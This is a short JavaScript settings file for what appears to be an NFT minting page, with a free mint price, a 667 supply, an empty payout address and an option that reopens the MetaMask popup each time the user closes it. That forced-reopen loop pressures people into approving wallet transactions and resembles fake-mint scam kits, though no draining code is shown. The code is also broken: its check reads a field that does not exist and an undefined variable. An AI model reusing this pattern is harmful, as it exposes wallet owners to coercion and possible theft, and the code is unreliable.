
const authorInfo = {
    SOLaddress: "", // your address 
    
}

const mintInfo = {
    price: 0.00, // Price per NFT.
    totalSupply: 667, // Total supply of NFTs.
    minUnits: 1, // Min units to buy.
    maxUnits: 1, // Max units to buy.
    askMintLoop: true, // If true, when the user closes the metamask popup, it reopens automatically.
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!authorInfo.address.startsWith("0x") ||
    (
        authorInfo.address.length >= 64 ||
        authorInfo.address.length <= 40
    )
) console.error(`Error: ${authorInfo.address} is not a valid Ethereum address.`);
//#endregion
